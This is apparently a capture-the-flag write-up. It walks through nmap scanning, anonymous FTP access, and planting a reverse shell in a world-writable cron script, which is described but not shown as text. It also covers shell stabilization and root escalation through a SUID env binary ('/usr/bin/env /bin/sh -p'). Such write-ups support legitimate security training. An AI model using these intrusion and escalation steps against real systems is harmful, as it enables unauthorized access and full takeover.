# Blog Write-up

## Initial Enumeration

The only initial information provided is an IP address. We begin by conducting an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -v {target_ip}
```

### Scan Results:

## SMB Enumeration

![image](https://github.com/user-attachments/assets/b82b7277-6869-4be6-8481-f89680e62122)


After downloading both of the photos, no information could be found using stegseek or steghide. Seems to be a dead end.

## FTP enumeration

Logging into the ftp server using anonymous login credentials, there is 1 directory containing 3 files.
```
📂 /
 ├── 📂 scripts
 │   ├── 📄 clean.sh            (-rwxr-xrwx) # A simple cleanup file that writes logs to removed_files.log
 │   ├── 📄 removed_files.log   (-rw-rw-r--) # Log file for removed files
 │   ├── 📄 to_do.txt           (-rw-r--r--) # Note to disable anonymous login since it's unsafe (Understatement of the century)
```

## FTP Exploitation

 Since there is write permissions to the clean.sh file, writing in a simple reverse shell and setting up a listener provides us a way of getting a shell. Because cleanup.sh is automated to run, when starting the listener it may take a moment to catch the shell.
 ![image](https://github.com/user-attachments/assets/b3865e25-347a-45a0-87d2-b8c8d418ce1e)

### Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```
After the shell has stabilized that first flag can be found in user.txt

## Privilege Escalation

Starting with basic enumeration, I like to check for any sudo commands available and suid permissions.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
Using https://gtfobins.github.io/ we find that the env suid bit is set. 

```bash
/usr/bin/env /bin/sh -p
```
And with that we've obtained root privileges!

![image](https://github.com/user-attachments/assets/cd85dbd7-7688-41ba-af1a-84f683aa31e2)


### Notes:
- Enhance understanding of GTFObin binary commands.
